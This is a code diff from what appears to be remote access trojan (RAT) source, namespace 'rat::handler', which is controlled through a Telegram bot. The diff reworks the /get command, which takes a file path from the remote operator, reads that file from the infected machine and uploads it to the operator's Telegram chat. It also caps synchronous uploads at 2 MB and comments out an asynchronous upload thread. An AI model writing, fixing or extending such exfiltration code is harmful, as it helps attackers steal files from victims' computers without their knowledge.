@@ -12,6 +12,7 @@
 #include <filesystem>
 #include <algorithm>
 #include "logging.hpp"
+constexpr size_t MAX_TELEGRAM_UPLOAD_SIZE = 50 * 1024 * KB; 
 
 namespace rat::handler {
 
@@ -424,56 +425,51 @@ void Handler::handleTouchCommand() {
     bot.sendMessage(response);
 }
 
+/*This method cannot run asynchronously for big files because the upload will be interrupted from the https requests that are sent from the parent thread */
 void Handler::handleGetCommand() {
     if (command.parameters.empty()) {
         bot.sendMessage("No file specified");
         return;
     }
-
-    // Strip quotes from parameter if present
-    std::string file_path_str = command.parameters[0];
-    if (!file_path_str.empty() && file_path_str.front() == '"' && file_path_str.back() == '"') {
-        file_path_str = file_path_str.substr(1, file_path_str.size() - 2);
-    }
-
-    auto file_path = rat::system::normalizePath(file_path_str);
-
+    
+    const auto file_path = rat::system::normalizePath(command.parameters[0]);
     if (!std::filesystem::exists(file_path)) {
         bot.sendMessage(fmt::format("File does not exist: {}", file_path.string()));
         return;
     }
-
-    auto file_size = std::filesystem::file_size(file_path);
+    
+    const size_t file_size = std::filesystem::file_size(file_path);
     DEBUG_LOG("Uploading {} of size {} bytes", file_path.string(), file_size);
-
-    const size_t MAX_SIZE = 50 * 1024 * KB; // 50 MB limit
-
-    if (file_size < 1.5 * 1024 * KB) { 
-        // Small file: send synchronously
-        bot.sendFile(file_path);
-    } else if (file_size < MAX_SIZE) {
-        // Medium file: send asynchronously
-        auto copy_bot = std::make_shared<tbot::Bot>(bot.getToken(), bot.getMasterId());
+    if(file_size < 2 * 1024 * KB) {
+        this->bot.sendFile(file_path);
+    }
+/*
+    else if (file_size < MAX_TELEGRAM_UPLOAD_SIZE) { // Defined in this file with constexpr
+        // Medium file: send asynchronously 
+        auto copy_bot = std::make_shared<tbot::Bot>(bot.getToken(), bot.getMasterId(), 255);
         std::thread([copy_bot, file_path]() {
             try {
                 DEBUG_LOG("Launching a thread to upload the file {}", file_path.string());
+                copy_bot->sendFile("Uploading the file asynchronously");
                 auto resp = copy_bot->sendFile(file_path);
                 if (resp != rat::tbot::BotResponse::SUCCESS) {
                     ERROR_LOG("Failed to upload {}", file_path.string());
                 }
             } catch (const std::exception& ex) {
-                const std::string message = fmt::format("Exception in async upload thread: {}", ex.what()); 
+                const std::string message = fmt::format("Exception in async upload thread: {}", ex.what());
                 ERROR_LOG(message);
                 copy_bot->sendMessage(message);
             } catch (...) {
                 ERROR_LOG("Unknown exception in async upload thread");
             }
-          }).detach();
-    } else {
-        // Too big for Telegram
-        bot.sendMessage("File too big for Telegram (max 50 MB)");
+        }).detach();
+*/ 
+//even after fixing the curl timout issue this is still causing a bug, basically I think the thread never achieves the uploads and it never terminates
+    else {
+        this->bot.sendMessage(fmt::format("File too big for Telegram (max 50 MB or the /get method 2MB), this one is {}", file_size));
     }
 }
+
 void Handler::handleStatCommand() {
     if (command.parameters.empty()) {
         bot.sendMessage("No file specified");
